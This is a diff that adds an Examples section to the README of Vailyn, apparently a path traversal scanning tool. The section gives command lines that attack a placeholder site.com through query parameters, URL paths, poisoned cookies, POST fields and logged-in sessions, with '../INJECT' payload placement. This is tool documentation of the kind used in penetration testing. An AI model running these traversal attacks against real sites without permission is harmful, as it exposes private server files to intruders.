@@ -128,6 +128,32 @@ To distinguish real results from false positives, Vailyn does the following chec
 * check if common error signatures are in the response content
 * check if the payload is contained in the response: this is an additional check for the case the server responds 200 for non-existing files, and reflects the payload in a message like (../../secret not found)
 
+### Examples
+
+* Simple Query attack:
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file` --> http://site.com/download.php?file=../INJECT
+
+* Query attack, but I know a file `index.php exists on same level:
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file -i index.php -d 1 X`
+This will shorten the duration of Phase 1 very much, since its a targeted attack.
+
+* Simple Path attack:
+`$ Vailyn -v "http://site.com/" -a 2 -l dicts/files dicts/dirs` --> http://site.com/../INJECT
+
+* Path attack, but I need query parameters and tag:
+`$ Vailyn -v "http://site.com/" -a 2 -l dicts/files dicts/dirs -q "?token=X#title"` --> http://site.com/../INJECT?token=X#title
+
+* Simple Cookie attack:
+`$ Vailyn -v "http://site.com/cookiemonster.php" -a 3 -l dicts/files dicts/dirs`
+Will fetch cookies and you can select cookie you want to poison
+
+* POST Attack:
+`$ Vailyn -v "http://site.com/download.php" -a 4 -l dicts/files dicts/dirs -s "DATA1=xx&DATA2=INJECT"`
+will infect DATA2 with the payload
+
+* Attack, but target is behind login screen:
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -c cookie.txt`
+
 ### Demo
 
 [![asciicast](https://asciinema.org/a/348613.svg)](https://asciinema.org/a/348613)
